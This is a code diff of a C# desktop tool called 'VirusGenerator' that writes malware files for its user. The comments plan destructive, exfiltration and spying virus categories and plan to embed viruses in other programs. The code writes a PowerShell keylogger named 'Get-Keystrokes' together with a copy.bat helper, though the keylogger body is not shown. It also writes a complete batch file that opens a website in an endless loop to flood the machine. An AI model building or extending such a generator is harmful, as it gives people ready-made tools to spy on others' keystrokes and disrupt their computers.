@@ -10,13 +10,16 @@ Goals/TODO:
 
 TODO:
 1. Support '.exe' files. Learn how to compile 
-2. Support '.py' viruses
-3. Support '.ps1' viruses
-5. Embed viruses in other programs.
+2. Support '.py' viruses -- Write a bunch of viruses in python and then add them as resources for this project.
+3. Embed viruses in other programs.
+4. Add a help wiki/Readme
+5. Add 'categories' of viruses i.e destructive, exfiltration, spying, etc.
  
 Logic:
-1. take some user input about what kind of virus they want to generate
+1. Take some user input about what kind of virus they want to generate
 2. Write out those specifications to a file.
+
+
 */
 
 
@@ -83,15 +86,15 @@ namespace VirusGenerator
             {
                 MessageBox.Show("Please note that this virus will only work with the name 'Get-Keystrokes', the name will automatically be changed for you.", "NOTICE");
 
-                _fileName = "Get-Keystrokes";
+                _fileName = "Get-Keystrokes"; //Auto switch the fileName and fileExt to what the keylogger requires.
                 _fileExt = ".ps1";
 
                 string folderPath = _outputFolder + "Get-Keystrokes";
                 
-                Path.Combine(folderPath, _fileName);
-                Directory.CreateDirectory(folderPath);
+                Path.Combine(folderPath, _fileName); 
+                Directory.CreateDirectory(folderPath); //Create the directory.
 
-                File.WriteAllText(folderPath + "\\" + _fileName + _fileExt, getKeys);
+                File.WriteAllText(folderPath + "\\" + _fileName + _fileExt, getKeys); //Write the readme, copy.bat and get-keystrokes.ps1 to the directory previously created.
                 File.WriteAllText(folderPath + "\\" + "README.txt", readmeKeylogger);
                 File.WriteAllText(folderPath + "\\" + "copy.bat", copyKeylogger);
 
@@ -101,13 +104,14 @@ namespace VirusGenerator
 
             if (CBoxAttack.Text == "Nyan Cat Bomb Attack")
             {
-                if (_fileExt == ".bat")
-                {
-                    string[] nyanCatCmd = { "@echo off", ":loop", "start http://www.nyancat.com", "goto loop" };
-                    File.WriteAllLines(_outputFolder + _fileName + _fileExt, nyanCatCmd);
-                }
-                else
-                    MessageBox.Show("Unfortunately this attack only works in a '.bat' format. Select that and re-generate.");
+                MessageBox.Show("This attack only works in a '.bat' format. This will be done automatically for you.");
+
+                _fileExt = ".bat";
+
+                string[] nyanCatCmd = { "@echo off", ":loop", "start http://www.nyan.cat", "goto loop" };
+                File.WriteAllLines(_outputFolder + _fileName + _fileExt, nyanCatCmd);
+                
+                    
             }
 
             ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
